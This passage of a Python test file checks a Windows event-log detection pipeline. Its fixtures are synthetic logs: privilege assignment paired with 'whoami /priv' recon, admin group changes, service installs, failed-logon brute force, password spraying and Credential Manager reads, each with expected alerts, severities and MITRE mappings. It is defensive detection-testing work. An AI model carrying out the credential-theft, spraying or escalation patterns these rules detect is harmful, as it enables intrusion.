    3. Standalone Event ID 4672 for SYSTEM, LOCAL SERVICE, NETWORK SERVICE, DWM-*, UMFD-* produces zero alerts.
    4. Standalone Event ID 4672 for non-service user (Harsha) without corroboration produces zero alerts.
    5. Opening elevated console (4688 cmd/powershell alone) produces zero privilege escalation alerts.
    6. Non-service Event ID 4672 with sensitive privileges corroborated by:
       a) 4688 elevated recon/privilege commands within <= 300s window triggers RULE-PRIVESC-CONTEXT-01 (High).
       b) 4732 administrative security group modification triggers RULE-PRIVESC-CONTEXT-01 (High).
       c) 7045 new service installation triggers RULE-PRIVESC-CONTEXT-01 (High).
    7. Correlation synthesizes dedicated 'Context-Aware Privilege Escalation Activity' incident (High).
    8. Bounded temporal window prevents unrelated background 5379 and 4798 events from escalating to Critical.
    9. LogEnricher maps T1548.002 and T1548 to 'Privilege Escalation' tactic.
    """
    from analysis.parser import NXLogReader
    from analysis.normalize import normalize_events
    from analysis.enrich import LogEnricher
    from agents.detection_agent import DetectionAgent
    from agents.correlation_agent import CorrelationAgent
    from agents.threat_intelligence_agent import ThreatIntelligenceAgent

    reader = NXLogReader()
    det = DetectionAgent()
    corr = CorrelationAgent()

    # 1. Verify Event ID 4688 command-line parsing ignores blank/explanatory text
    raw_4688_blank_cmd = (
        "2026-10-13 10:00:01 Harsha AUDIT_SUCCESS 4688 A new process has been created.\n\n"
        "Subject:\n"
        "\tSecurity ID:\t\tS-1-5-21-1251900359-2259549607-1534340609-1005\n"
        "\tAccount Name:\t\tHarsha\n\n"
        "Process Information:\n"
        "\tNew Process ID:\t\t0x1a2b\n"
        "\tNew Process Name:\tC:\\Windows\\System32\\cmd.exe\n"
        "\tProcess Command Line:\t\n\n"
        "\tToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\n"
    )
    parsed_4688 = reader.parse_line(raw_4688_blank_cmd)
    assert parsed_4688 is not None
    assert parsed_4688["command_line"] == "N/A"
    assert "Token Elevation Type" not in parsed_4688["command_line"]

    # 2. Verify Event ID 4672 extracts actual privilege list from multiline text
    raw_4672_multiline = (
        "2026-10-13 10:00:02 Harsha AUDIT_SUCCESS 4672 Special privileges assigned to new logon.\n\n"
        "Subject:\n"
        "\tSecurity ID:\t\tS-1-5-21-1251900359-2259549607-1534340609-1005\n"
        "\tAccount Name:\t\tHarsha\n"
        "\tAccount Domain:\t\tHARSHA\n"
        "\tLogon ID:\t\t0x4F0E3B2A\n\n"
        "Privileges:\t\tSeSecurityPrivilege\n"
        "\t\t\tSeTakeOwnershipPrivilege\n"
        "\t\t\tSeLoadDriverPrivilege\n"
        "\t\t\tSeBackupPrivilege\n"
        "\t\t\tSeRestorePrivilege\n"
        "\t\t\tSeDebugPrivilege\n"
        "\t\t\tSeSystemEnvironmentPrivilege\n"
        "\t\t\tSeImpersonatePrivilege\n"
    )
    parsed_4672 = reader.parse_line(raw_4672_multiline)
    assert parsed_4672 is not None
    assert isinstance(parsed_4672.get("privileges"), list)
    assert "SeDebugPrivilege" in parsed_4672["privileges"]
    assert "SeTakeOwnershipPrivilege" in parsed_4672["privileges"]
    assert "SeImpersonatePrivilege" in parsed_4672["privileges"]

    # 3. Verify standalone Event ID 4672 for SYSTEM, LOCAL SERVICE, and DWM produces zero alerts
    system_4672 = normalize_events([{
        "timestamp": "2026-10-13 10:05:00",
        "source": "real_nxlog_windows",
        "event_id": 4672,
        "hostname": "Harsha",
        "user": "SYSTEM",
        "privileges": ["SeDebugPrivilege", "SeTcbPrivilege", "SeAssignPrimaryTokenPrivilege"],
        "description": "Special privileges assigned to new logon (SYSTEM).",
    }])
    service_4672 = normalize_events([{
        "timestamp": "2026-10-13 10:05:01",
        "source": "real_nxlog_windows",
        "event_id": 4672,
        "hostname": "Harsha",
        "user": "LOCAL SERVICE",
        "privileges": ["SeImpersonatePrivilege"],
        "description": "Special privileges assigned to new logon (LOCAL SERVICE).",
    }])
    dwm_4672 = normalize_events([{
        "timestamp": "2026-10-13 10:05:02",
        "source": "real_nxlog_windows",
        "event_id": 4672,
        "hostname": "Harsha",
        "user": "DWM-1",
        "privileges": ["SeImpersonatePrivilege"],
        "description": "Special privileges assigned to new logon (DWM-1).",
    }])
    assert det.detect(system_4672) == []
    assert det.detect(service_4672) == []
    assert det.detect(dwm_4672) == []

    # 4. Verify standalone Event ID 4672 for non-service user (Harsha) without corroboration produces zero alerts
    harsha_standalone = normalize_events([{
        "timestamp": "2026-10-13 10:06:00",
        "source": "real_nxlog_windows",
        "event_id": 4672,
        "hostname": "Harsha",
        "user": "Harsha",
        "privileges": ["SeDebugPrivilege", "SeTakeOwnershipPrivilege"],
        "description": "Special privileges assigned to new logon (Harsha).",
    }])
    assert det.detect(harsha_standalone) == []

    # 5. Verify opening elevated console alone (cmd.exe / powershell.exe) without sensitive privilege assignment produces zero privilege alerts
    console_alone = normalize_events([{
        "timestamp": "2026-10-13 10:07:00",
        "source": "real_nxlog_windows",
        "event_id": 4688,
        "hostname": "Harsha",
        "user": "Harsha",
        "process_name": "cmd.exe",
        "command_line": "cmd.exe",
        "description": "A new process has been created.",
    }])
    console_alerts = det.detect(console_alone)
    assert not any(a["rule_id"] == "RULE-PRIVESC-CONTEXT-01" for a in console_alerts)

    # 6. Verify Context-Aware Privilege Escalation (RULE-PRIVESC-CONTEXT-01) triggers on corroboration:
    # 6a. Corroboration with elevated recon command (whoami /priv) within bounded window
    privesc_pair_recon = normalize_events([
        {
            "timestamp": "2026-10-13 10:10:00",
            "source": "real_nxlog_windows",
            "event_id": 4672,
            "hostname": "Harsha",
            "user": "Harsha",
            "privileges": ["SeDebugPrivilege", "SeTakeOwnershipPrivilege"],
            "description": "Special privileges assigned to new logon.",
        },
        {
            "timestamp": "2026-10-13 10:10:05",
            "source": "real_nxlog_windows",
            "event_id": 4688,
            "hostname": "Harsha",
            "user": "Harsha",
            "process_name": "whoami.exe",
            "command_line": "whoami.exe /priv",
            "description": "A new process has been created.",
        },
    ])
    recon_alerts = det.detect(privesc_pair_recon)
    assert len(recon_alerts) == 1
    assert recon_alerts[0]["rule_id"] == "RULE-PRIVESC-CONTEXT-01"
    assert recon_alerts[0]["severity"] == "High"
    assert recon_alerts[0]["confidence"] == 88
    assert recon_alerts[0]["mitre_technique"] == "T1548.002"
    assert recon_alerts[0]["corroborating_event_id"] == 4688

    # 6b. Corroboration with administrative security group modification (4732)
    privesc_pair_group = normalize_events([
        {
            "timestamp": "2026-10-13 10:12:00",
            "source": "real_nxlog_windows",
            "event_id": 4672,
            "hostname": "Harsha",
            "user": "Harsha",
            "privileges": ["SeDebugPrivilege", "SeImpersonatePrivilege"],
            "description": "Special privileges assigned to new logon.",
        },
        {
            "timestamp": "2026-10-13 10:12:15",
            "source": "real_nxlog_windows",
            "event_id": 4732,
            "hostname": "Harsha",
            "user": "Harsha",
            "process_name": "N/A",
            "command_line": "N/A",
            "description": "A member was added to a security-enabled local group (Administrators).",
        },
    ])
    group_alerts = det.detect(privesc_pair_group)
    assert len(group_alerts) == 1
    assert group_alerts[0]["rule_id"] == "RULE-PRIVESC-CONTEXT-01"
    assert group_alerts[0]["corroborating_event_id"] == 4732

    # 6c. Corroboration with new service installation (7045)
    privesc_pair_service = normalize_events([
        {
            "timestamp": "2026-10-13 10:14:00",
            "source": "real_nxlog_windows",
            "event_id": 4672,
            "hostname": "Harsha",
            "user": "Harsha",
            "privileges": ["SeLoadDriverPrivilege", "SeDebugPrivilege"],
            "description": "Special privileges assigned to new logon.",
        },
        {
            "timestamp": "2026-10-13 10:14:20",
            "source": "real_nxlog_windows",
            "event_id": 7045,
            "hostname": "Harsha",
            "user": "Harsha",
            "process_name": "services.exe",
            "command_line": "N/A",
            "description": "A service was installed in the system.",
        },
    ])
    svc_alerts = det.detect(privesc_pair_service)
    assert len(svc_alerts) == 1
    assert svc_alerts[0]["rule_id"] == "RULE-PRIVESC-CONTEXT-01"
    assert svc_alerts[0]["corroborating_event_id"] == 7045

    # 7. Correlation synthesizes dedicated 'Context-Aware Privilege Escalation Activity' incident
    privesc_incs = ThreatIntelligenceAgent().analyze(corr.correlate(recon_alerts))
    assert len(privesc_incs) == 1
    assert privesc_incs[0]["incident_name"] == "Context-Aware Privilege Escalation Activity"
    assert privesc_incs[0]["severity"] == "High"
    assert privesc_incs[0]["confidence"] == 88
    assert "T1548.002" in privesc_incs[0]["mitre_techniques"]
    assert privesc_incs[0]["affected_host"] == "Harsha"
    assert privesc_incs[0]["affected_user"] == "Harsha"

    # 8. Verify co-occurring background 5379/4798 events do NOT escalate into a Critical incident
    mixed_batch = privesc_pair_recon + normalize_events([
        {
            "timestamp": "2026-10-13 10:10:02",
            "source": "real_nxlog_windows",
            "event_id": 5379,
            "hostname": "Harsha",
            "user": "Harsha",
            "process_name": "background_app.exe",
            "command_line": "N/A",
            "description": "A credential was read from Windows Credential Manager.",
        },
        {
            "timestamp": "2026-10-13 10:10:04",
            "source": "real_nxlog_windows",
            "event_id": 4798,
            "hostname": "Harsha",
            "user": "Harsha",
            "process_name": "background_svc.exe",
            "command_line": "N/A",
            "description": "A user's local group membership was enumerated.",
        },
    ])
    mixed_alerts = det.detect(mixed_batch)
    assert any(a["rule_id"] == "RULE-PRIVESC-CONTEXT-01" for a in mixed_alerts)
    mixed_incs = ThreatIntelligenceAgent().analyze(corr.correlate(mixed_alerts))
    assert not any(inc["severity"] == "Critical" for inc in mixed_incs)
    pe_inc = next(inc for inc in mixed_incs if inc["incident_name"] == "Context-Aware Privilege Escalation Activity")
    assert pe_inc["severity"] == "High"
    assert pe_inc["confidence"] == 88

    # 9. Verify MITRE Tactic mapping in LogEnricher
    assert LogEnricher.TACTIC_MAP.get("T1548.002") == "Privilege Escalation"
    assert LogEnricher.TACTIC_MAP.get("T1548") == "Privilege Escalation"


def test_brute_force_and_cred_manager_isolation_regression():
    """
    Regression verification for Brute Force & Credential Manager False-Positive Fix:
    1. Repeated Event ID 5379 events alone never trigger or expand a brute-force or password-spraying incident.
    2. Valid Event ID 4625 brute-force scenarios detect and correlate accurately.
    3. Multi-account password spraying is correctly distinguished and classified.
    4. Co-occurring 4625 failed logins and 5379/4798 credential/discovery events produce separate,
       uninflated incidents rather than bleeding into one bloated brute-force incident.
    5. Historical incidents with stale metadata (like INC-54F131) reconcile to actual supporting alerts.
    """
    from agents.detection_agent import DetectionAgent
    from agents.correlation_agent import CorrelationAgent, apply_cumulative_incident_tracking
    from analysis.normalize import normalize_events

    det = DetectionAgent()
    corr = CorrelationAgent()

    # 1. Verify 20 benign Event ID 5379 events do NOT generate brute-force or password-spraying incidents
    cred_events = normalize_events([
        {
            "timestamp": f"2026-10-13 14:00:{i:02d}",
            "source": "real_nxlog_windows",
            "event_id": 5379,
            "hostname": "Harsha",
            "user": "Harsha",
            "process_name": "background_app.exe",
            "command_line": "N/A",
            "description": "A credential was read from Windows Credential Manager.",
            "record_offset": 50000000 + i * 100,
        }
        for i in range(20)
    ])
    cred_alerts = det.detect(cred_events)
    assert len(cred_alerts) == 20
    assert all(a["rule_id"] == "RULE-CRED-5379" for a in cred_alerts)
    assert all(a["severity"] == "Low" for a in cred_alerts)
    assert all(a["mitre_technique"] == "T1555.004" for a in cred_alerts)

    cred_incs = corr.correlate(cred_alerts)
    assert len(cred_incs) == 1
    assert "Credential Manager" in cred_incs[0]["incident_name"]
    assert "Brute Force" not in cred_incs[0]["incident_name"]
    assert "Password Spraying" not in cred_incs[0]["incident_name"]
    assert cred_incs[0]["severity"] == "Low"
    assert cred_incs[0]["mitre_techniques"] == ["T1555.004"]

    # 2. Valid Event ID 4625 brute-force scenario correlates correctly
    bf_events = normalize_events([
        {
            "timestamp": f"2026-10-13 14:05:{i*10:02d}",
            "source": "real_nxlog_windows",
            "event_id": 4625,
            "hostname": "Harsha",
            "user": "victim_user",
            "source_ip": "11.12.4.164",
            "process_name": "-",
            "command_line": "N/A",
            "description": "An account failed to log on.",
            "record_offset": 51000000 + i * 100,
        }
        for i in range(3)
    ])
    bf_alerts = det.detect(bf_events)
    assert len(bf_alerts) == 3
    assert all(a["rule_id"] == "RULE-AUTH-4625" for a in bf_alerts)

    bf_incs = corr.correlate(bf_alerts)
    assert len(bf_incs) == 1
    assert bf_incs[0]["incident_name"] == "Automated Brute Force & Password Spraying Attack"
    assert bf_incs[0]["severity"] == "High"
    assert bf_incs[0]["confidence"] == 90
    assert bf_incs[0]["alert_count"] == 3
    assert bf_incs[0]["affected_user"] == "victim_user"
    assert bf_incs[0]["mitre_techniques"] == ["T1110"]

    # 3. Multi-account password spraying scenario across distinct accounts
    spray_events = normalize_events([
        {
            "timestamp": f"2026-10-13 14:10:{i*10:02d}",
            "source": "real_nxlog_windows",
            "event_id": 4625,
            "hostname": "Harsha",
            "user": f"target_acct_{i}",
            "source_ip": "192.168.1.100",
            "process_name": "-",
            "command_line": "N/A",
            "description": "An account failed to log on.",
            "record_offset": 52000000 + i * 100,
        }
        for i in range(3)
    ])
    spray_alerts = det.detect(spray_events)
    spray_incs = corr.correlate(spray_alerts)
    assert len(spray_incs) == 1
    assert "Password Spraying" in spray_incs[0]["incident_name"]
    assert "3 Target Accounts" in spray_incs[0]["incident_name"]
    assert spray_incs[0]["severity"] == "High"
    assert "T1110.003" in spray_incs[0]["mitre_techniques"]

    # 4. Mixed attacks for same user remain separate and do NOT bleed together
    mixed_telemetry = normalize_events([
        # 3 genuine failed logins on Harsha for Harsha
        {
            "timestamp": f"2026-10-13 14:15:{i*5:02d}",
            "source": "real_nxlog_windows",
            "event_id": 4625,
            "hostname": "Harsha",
            "user": "Harsha",
            "source_ip": "11.12.4.164",
            "process_name": "-",
            "command_line": "N/A",
            "description": "An account failed to log on.",
            "record_offset": 53000000 + i * 100,
        }
        for i in range(3)
    ] + [
        # 10 credential manager reads on Harsha for Harsha
        {
            "timestamp": f"2026-10-13 14:15:{15 + i*2:02d}",
            "source": "real_nxlog_windows",
            "event_id": 5379,
            "hostname": "Harsha",
            "user": "Harsha",
            "process_name": "vault_read.exe",
            "command_line": "N/A",
            "description": "A credential was read from Windows Credential Manager.",
            "record_offset": 54000000 + i * 100,
        }
        for i in range(10)
    ] + [
        # 5 account group discovery events on Harsha for Harsha
        {
            "timestamp": f"2026-10-13 14:15:{35 + i*2:02d}",
            "source": "real_nxlog_windows",
            "event_id": 4798,
            "hostname": "Harsha",
            "user": "Harsha",
            "process_name": "recon_app.exe",
            "command_line": "N/A",
            "description": "A user's local group membership was enumerated.",
            "record_offset": 55000000 + i * 100,
        }
        for i in range(5)
    ])

    mixed_alerts = det.detect(mixed_telemetry)
    assert len(mixed_alerts) == 18
    mixed_incs = corr.correlate(mixed_alerts)
    # Must produce exactly TWO distinct incidents for Harsha
    assert len(mixed_incs) == 2

    # Brute force incident has ONLY 3 alerts
    bf_inc = next(i for i in mixed_incs if "Brute Force" in i["incident_name"])
    assert bf_inc["alert_count"] == 3
    assert bf_inc["severity"] == "High"
    assert bf_inc["incident_id"] == "INC-54F131"
    assert all(a["rule_id"] == "RULE-AUTH-4625" for a in bf_inc["alerts"])

    # Discovery & Credential Manager incident has ONLY 15 alerts
    recon_inc = next(i for i in mixed_incs if "Account Discovery" in i["incident_name"])
    assert recon_inc["alert_count"] == 15
    assert recon_inc["severity"] == "Low"
    assert recon_inc["incident_id"] == "INC-E8541E"
    assert all(a["rule_id"] in ("RULE-CRED-5379", "RULE-DISC-4798") for a in recon_inc["alerts"])

    # 5. Historical reconciliation of stale INC-54F131 snapshot
    stale_registry = {
        "INC-54F131": {
            "seen_alert_keys": {"key_1", "key_2", "key_3"},
            "metadata": {
                "incident_id": "INC-54F131",
                "incident_name": "Automated Brute Force & Password Spraying Attack",
                "severity": "High",
                "confidence": 90,
                "affected_host": "Harsha",
                "affected_user": "Harsha",
                "is_real_telemetry": True,
            },
            "recent_alerts": [
                {
                    "alert_name": "Windows Credential Manager Read Activity",
                    "rule_id": "RULE-CRED-5379",
                    "severity": "Low",
                    "confidence": 68,
                    "event": {
                        "event_id": 5379,
                        "hostname": "Harsha",
                        "user": "Harsha",
                        "source": "real_nxlog_windows",
                    },
                },
                {
                    "alert_name": "Account Discovery: Group Membership Enumeration",
                    "rule_id": "RULE-DISC-4798",
                    "severity": "Low",
                    "confidence": 65,
                    "event": {
                        "event_id": 4798,
                        "hostname": "Harsha",
                        "user": "Harsha",
                        "source": "real_nxlog_windows",
                    },
                },
            ],
        }
    }
    tracked = apply_cumulative_incident_tracking([], registry=stale_registry, retain_historical_incidents=True)
    reconciled = next(i for i in tracked if i["incident_id"] == "INC-54F131")
    assert reconciled["incident_name"] == "Account Discovery & Credential Manager Read Activity"
    assert reconciled["severity"] == "Low"
    assert reconciled["confidence"] == 70
    assert "T1555.004" in reconciled["mitre_techniques"]




